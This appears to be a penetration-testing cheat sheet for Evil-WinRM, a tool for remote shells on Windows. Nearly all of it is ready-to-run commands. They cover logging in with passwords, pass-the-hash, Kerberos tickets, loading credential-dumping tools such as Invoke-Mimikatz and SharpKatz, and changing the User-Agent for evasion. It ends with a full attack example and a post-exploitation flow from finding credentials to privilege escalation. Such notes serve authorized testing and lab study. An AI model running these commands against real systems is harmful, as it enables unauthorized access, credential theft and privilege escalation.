# 🪟 Evil-WinRM Command Cheat Sheet

---

> [!info] 🧩 Basic Connection Syntax
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASSWORD>
> ```
>
> **Example**
>
> ```bash
> evil-winrm -i 10.10.10.10 -u administrator -p Password123
> ```

---

> [!tip] 🔐 Login with NTLM Hash (Pass-the-Hash)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -H <NTHASH>
> ```
>
> **Example**
>
> ```bash
> evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee
> ```

---

> [!info] 🌐 Change Port (Non-default WinRM)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -P <PORT>
> ```
>
> **Example**
>
> ```bash
> evil-winrm -i 10.10.10.10 -u user -p pass -P 5986
> ```

---

> [!tip] 🔒 Enable SSL (HTTPS WinRM)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -S
> ```

---

> [!info] 📁 Upload / Use PowerShell Scripts
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -s /path/to/scripts
> ```
>
> 💡 Example usage inside session:
>
> ```powershell
> Invoke-Mimikatz.ps1
> ```

---

> [!tip] ⚙️ Use Local Executables (C# tools like SharpKatz)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -e /path/to/exes
> ```

---

> [!info] 🧠 Kerberos Authentication (Domain Environment)
>
> ```bash
> evil-winrm -i <FQDN> -r <DOMAIN> -u <USER> -p <PASS>
> ```
>
> **Example**
>
> ```bash
> evil-winrm -i winserver.contoso.com -r CONTOSO.COM -u user -p pass
> ```

---

> [!tip] 🎫 Use Kerberos Ticket (ccache/kirbi)
>
> ```bash
> evil-winrm -i <IP> -K <ticket.ccache>
> ```

---

> [!info] 🧬 Custom SPN (Kerberos tuning)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> --spn HTTP
> ```

---

> [!tip] 🌍 Custom WinRM Endpoint URL
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -U /wsman
> ```

---

> [!info] 🧾 Change User-Agent (Evasion)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -a "Mozilla/5.0"
> ```

---

> [!tip] 📜 Log Session Output
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -l
> ```

---

> [!warning] 🚫 Disable Colors (Clean Output / Logging)
>
> ```bash
> evil-winrm -i <IP> -u <USER> -p <PASS> -n
> ```

---

> [!info] 🔥 Full Feature Attack Example
>
> ```bash
> evil-winrm -i 10.10.10.10 \
>   -u administrator \
>   -p Password123 \
>   -s /opt/scripts \
>   -e /opt/exe \
>   -l
> ```

---

# 🧠 Mental Model

> [!quote] 🎯 Think Like This
>
> ```text
> Credentials → WinRM Port → Shell → Post-Exploitation Scripts
> ```
>
> Typical flow:
>
> ```bash
> netexec → find creds → evil-winrm → upload tools → escalate
> ```

---

